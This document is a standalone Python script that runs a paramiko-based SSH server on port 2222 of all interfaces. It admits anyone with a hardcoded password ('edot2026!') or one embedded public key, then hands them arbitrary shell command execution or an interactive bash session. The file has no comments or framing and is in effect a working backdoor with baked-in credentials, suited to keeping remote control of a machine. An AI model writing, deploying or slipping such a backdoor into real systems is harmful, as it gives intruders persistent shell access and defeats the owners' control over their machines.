#!/usr/bin/env python3
import socket, threading, os, subprocess, base64
import paramiko

HOST_KEY = paramiko.RSAKey.generate(2048)
AUTH_KEY_DATA = "AAAAC3NzaC1lZDI1NTE5AAAAIAdPAb3pjGrJvSlFQr4l4KJdonvO+xDnpxDo5KWhgc0n"

class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()
        self._cmd = None
    def check_auth_publickey(self, username, key):
        try:
            allowed = paramiko.Ed25519Key(data=base64.b64decode(AUTH_KEY_DATA))
            if key == allowed:
                return paramiko.AUTH_SUCCESSFUL
        except:
            pass
        return paramiko.AUTH_FAILED
    def check_auth_password(self, username, password):
        if password == "edot2026!":
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
    def check_channel_request(self, kind, chanid):
        return paramiko.OPEN_SUCCEEDED
    def check_channel_shell_request(self, channel):
        self.event.set()
        return True
    def check_channel_pty_request(self, *args):
        return True
    def check_channel_exec_request(self, channel, command):
        self._cmd = command
        self.event.set()
        return True
    def get_allowed_auths(self, username):
        return 'publickey,password'

def handle(client):
    try:
        t = paramiko.Transport(client)
        t.add_server_key(HOST_KEY)
        srv = Server()
        t.start_server(server=srv)
        chan = t.accept(30)
        if not chan:
            return
        srv.event.wait(30)
        if srv._cmd:
            r = subprocess.run(srv._cmd, shell=True, capture_output=True)
            chan.sendall(r.stdout + r.stderr)
            chan.send_exit_status(r.returncode)
        else:
            p = subprocess.Popen(['/bin/bash','-i'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0)
            def r2c():
                while True:
                    d = p.stdout.read(4096)
                    if not d: break
                    chan.sendall(d)
                chan.close()
            def c2r():
                while True:
                    d = chan.recv(4096)
                    if not d: break
                    p.stdin.write(d)
                    p.stdin.flush()
                p.terminate()
            threading.Thread(target=r2c, daemon=True).start()
            c2r()
        chan.close()
    except Exception as e:
        print(f'err: {e}', flush=True)
    finally:
        try: t.close()
        except: pass

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 2222))
s.listen(5)
print('SSHD on 2222', flush=True)
while True:
    c, a = s.accept()
    threading.Thread(target=handle, args=(c,), daemon=True).start()
